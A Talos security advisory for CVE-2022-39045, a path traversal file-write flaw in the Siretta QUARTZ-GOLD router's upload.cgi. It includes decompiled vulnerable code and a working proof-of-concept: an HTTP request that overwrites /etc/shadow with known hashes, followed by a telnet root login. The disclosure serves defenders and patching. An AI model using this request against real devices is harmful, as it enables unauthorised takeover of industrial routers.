# Talos Vulnerability Report

### TALOS-2022-1611

## Siretta QUARTZ-GOLD httpd upload.cgi file write vulnerability

##### January 26, 2023

##### CVE Number

CVE-2022-39045

##### SUMMARY

A file write vulnerability exists in the httpd upload.cgi functionality of Siretta QUARTZ-GOLD G5.0.1.5-210720-141020. A specially-crafted HTTP request can lead to arbitrary file upload. An attacker can send an HTTP request to trigger this vulnerability.

##### CONFIRMED VULNERABLE VERSIONS

The versions below were either tested or verified to be vulnerable by Talos or confirmed to be vulnerable by the vendor.

Siretta QUARTZ-GOLD G5.0.1.5-210720-141020

##### PRODUCT URLS

QUARTZ-GOLD - <https://www.siretta.com/products/industrial-routers/4g-lte-router/gigabit-ethernet-small-footprint-lte-router-eu/>

##### CVSSv3 SCORE

7.2 - CVSS:3.0/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H

##### CWE

CWE-22 - Improper Limitation of a Pathname to a Restricted Directory (‘Path Traversal’)

##### DETAILS

The Siretta QUARTZ-GOLD is an industrial cellular router with several features and services, such as: SSH, UPNP, VPN, SNMP and many others.

The QUARTZ-GOLD router has a web server with several functionalities, a subset of which are related to the management of external files. Indeed, the web-server offers API for uploading files, downloading them, and also deleting if no longer required.

The endpoint `upload.cgi` permits to upload a file. Following one of the functions responsible for this API:

```
void input_upload.cgi(char *path,int len,char *boundary)

{
  [...]
  remaining_length_to_write = len;
  storage_udisk = nvram_get_int("storage_udisk");
  [... calculate base_folder and perform basic checks...]
  else {
    [...]
    filename_param = (char *)webcgi_safeget("filename");                                                        [1]
    filename = "";
    if (filename_param != (char *)0x0) {
      filename = filename_param;
    }
    sprintf(buff,"%s/%s",base_folder,filename);                                                                 [2]
    fd = fopen(buff,"w");                                                                                       [3]
    if (fd == (FILE *)0x0) {
      base_folder = "Unable to start pipe for mtd write";
    }
    else {
      [...]
      boundary_len = strlen(boundary);
      remaining_length_to_write = (remaining_length_to_write - 6) - boundary_len;
      while (0 < (int)remaining_length_to_write) {
        n_bytes_to_read = remaining_length_to_write;
        [...]
        n_bytes_read = web_read(buff,n_bytes_to_read);
        [...]
        remaining_length_to_write = remaining_length_to_write - n_bytes_read;
        bytes_written = safe_fwrite(buff,1,n_bytes_read,fd);                                                    [4]
        [...]
}

```

This function will fetch the specified filename, at `[1]`, and then it will use it to compose the file-path at `[2]`. The compose file-path is used at `[3]` to create/overwrite the file, and then the uploaded file will be used for the content of the just-created/overwritten file at `[4]`.
Because from `[1]` up to `[2]` no sanitization is performed against the `filename` parameter, this function is vulnerable to a path traversal vulnerability. This can lead to overwriting an arbitrary file in the file-system and can lead to arbitrary command execution.

### Exploit Proof of Concept

Sending a request like the following:

```
POST /upload.cgi?_http_id=<the correct tid>&filename=..%2F..%2F..%2Fetc%2Fshadow HTTP/1.1
Authorization: Basic <a valid basic auth value>
Content-Length: 286
Content-Type: multipart/form-data; boundary=906881afb7fae201f7f9962a229f9884

--906881afb7fae201f7f9962a229f9884
Content-Disposition: form-data; name="content"; filename="content"

root:$1$xxhYe9mq$YZ6ujl9zSX304B71rcuY80:0:0:99999:7:0:0:
admin:$1$xxhYe9mq$YZ6ujl9zSX304B71rcuY80:0:0:99999:7:0:0:
nobody:*:0:0:99999:7:0:0:
--906881afb7fae201f7f9962a229f9884--

```

If the request was successful, it is now possible to access the device using `root:admin` as credentials.
For instance connecting, using telnet, to the port 2323 we can provide the injected credentials:

```
❯ telnet 192.168.0.1 2323
Trying 192.168.0.1...
Connected to 192.168.0.1.
Escape character is '^]'.
QUARTZ-GOLD login: root
Password:

root@QUARTZ-GOLD:/tmp/home/root#

```

Effectively allowing arbitrary command execution.
